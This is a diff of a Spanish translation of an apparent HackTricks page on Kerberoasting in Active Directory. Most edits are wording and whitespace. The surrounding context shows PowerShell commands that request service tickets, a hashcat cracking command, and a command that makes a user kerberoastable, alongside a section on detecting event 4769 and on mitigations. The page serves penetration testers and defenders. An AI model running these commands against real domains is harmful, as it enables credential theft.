@@ -1,11 +1,11 @@
 ## Kerberoast
 
 El objetivo de **Kerberoasting** es recolectar **tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario** en AD, no de cuentas de computadora. Por lo tanto, **parte** de estos tickets TGS están **encriptados** con **claves** derivadas de las contraseñas de usuario. Como consecuencia, sus credenciales podrían ser **descifradas sin conexión**.\
-Puede saber que una **cuenta de usuario** se está utilizando como un **servicio** porque la propiedad **"ServicePrincipalName"** no es nula.
+Puede saber que una **cuenta de usuario** se está utilizando como **servicio** porque la propiedad **"ServicePrincipalName"** no es nula.
 
 Por lo tanto, para realizar Kerberoasting, solo se necesita una cuenta de dominio que pueda solicitar TGS, lo que es cualquiera ya que no se requieren privilegios especiales.
 
-**Necesitas credenciales válidas dentro del dominio.**
+**Necesita credenciales válidas dentro del dominio.**
 
 ### **Ataque**
 
@@ -32,8 +32,8 @@ Get-NetUser -SPN | select serviceprincipalname #Powerview
 * **Técnica 1: Solicitar TGS y volcarlo desde la memoria**
 ```powershell
 #Get TGS in memory from a single user
-Add-Type -AssemblyName System.IdentityModel 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
 
 #Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
 setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
@@ -74,7 +74,7 @@ Cuando se solicita un TGS, se genera el evento de Windows `4769 - Se solicitó u
 ![](<../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Utilice [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo impulsados por las herramientas de la comunidad más avanzadas del mundo.\
+Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad más avanzadas del mundo.\
 Obtenga acceso hoy mismo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -89,11 +89,13 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 
 Si tienes **suficientes permisos** sobre un usuario, puedes **hacer que sea kerberoastable**:
 ```bash
- Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-Puedes encontrar **herramientas** útiles para ataques **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+Puede encontrar **herramientas** útiles para ataques **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** es debido a la hora local, necesitas sincronizar el host con el DC: `ntpdate <IP del DC>`
+Si encuentra este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** es debido a su hora local, necesita sincronizar el host con el DC. Hay algunas opciones:
+- `ntpdate <IP del DC>` - Obsoleto a partir de Ubuntu 16.04
+- `rdate -n <IP del DC>`
 
 ### Mitigación
 
@@ -101,14 +103,14 @@ Kerberoast es muy sigiloso si es explotable
 
 * Evento de seguridad ID 4769 - Se solicitó un ticket Kerberos
 * Dado que 4769 es muy frecuente, filtremos los resultados:
-  * El nombre del servicio no debe ser krbtgt
-  * El nombre del servicio no debe terminar con $ (para filtrar las cuentas de máquina utilizadas para servicios)
-  * El nombre de la cuenta no debe ser machine@domain (para filtrar las solicitudes de máquinas)
-  * El código de error debe ser '0x0' (para filtrar los fallos, 0x0 es éxito)
-  * Lo más importante, el tipo de cifrado del ticket es 0x17
+* El nombre del servicio no debe ser krbtgt
+* El nombre del servicio no termina con $ (para filtrar las cuentas de máquina utilizadas para servicios)
+* El nombre de la cuenta no debe ser machine@domain (para filtrar las solicitudes de máquinas)
+* El código de error es '0x0' (para filtrar los fallos, 0x0 es éxito)
+* Lo más importante, el tipo de cifrado del ticket es 0x17
 * Mitigación:
-  * Las contraseñas de la cuenta de servicio deben ser difíciles de adivinar (más de 25 caracteres)
-  * Utilice cuentas de servicio administradas (cambio automático de contraseña periódicamente y gestión delegada de SPN)
+* Las contraseñas de la cuenta de servicio deben ser difíciles de adivinar (más de 25 caracteres)
+* Use cuentas de servicio administradas (cambio automático de contraseña periódicamente y gestión delegada de SPN)
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
@@ -130,6 +132,6 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 \
 Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas de la comunidad más avanzadas del mundo.\
-Obtén acceso hoy mismo:
+Obtén acceso hoy:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
